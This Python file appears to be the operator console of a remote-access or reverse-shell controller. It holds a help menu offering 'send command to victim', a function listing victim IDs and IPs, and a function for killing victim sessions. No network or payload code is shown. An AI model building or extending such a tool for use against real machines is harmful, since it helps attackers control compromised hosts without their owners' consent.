import sys
from colorama import Fore, Back, Style
import victims

def exit_program():
    print(Fore.GREEN+"Bye!!!"+Style.RESET_ALL)
    sys.exit(0)
def print_main_help_msg():
				
		print(
		f'''
		\r  Command          Description
		\r  -------          -----------
		\r  help             Print this message.
		\r  send             Send Command to victim.
		\r  victims          List victims.
		\r  kill             Terminate victim connection.
		\r  exit             Kill all sessions and quit.
''')
def list_victims():
    print(Back.MAGENTA + "Listing all current vicitims..." + Style.RESET_ALL)
    if (victims.VICTIM_CTR) != 0:
            for victim in victims.VICTIM_LIST:
                print(Fore.CYAN + "Victim " + str(victim['ID']), ":", str(victim['IP']) + Style.RESET_ALL)
    else:
        print(Back.RED + "No victims at this time" + Style.RESET_ALL)

def kill_victim(victim):
    vic = int(victim[0])
    if len(victim) != 1:
        print(Fore.RED+"Invalid Argument. Only one argument should follow the 'kill command, and it should be a number"+Style.RESET_ALL)
        print("     Example: 'kill 1'")
    elif victims.VICTIM_CTR == 0:
        print(Back.RED+"Victim list is empty"+Style.RESET_ALL)
    elif victims.VICTIM_CTR < vic:
        print(Fore.RED+"Victim does not exist"+Style.RESET_ALL)
    else:
        is_there = 0
        for shells in victims.VICTIM_LIST:
            if shells['ID'] == vic:
                is_there = 1
                victims.VICTIM_LIST.pop(vic - 1)
                victims.VICTIM_CTR = victims.VICTIM_CTR - 1
                print(Fore.GREEN+"Successfully killed Victim: "+str(vic)+Style.RESET_ALL)
        if is_there == 0:
            print(Fore.RED+"Victim does not exist"+Style.RESET_ALL)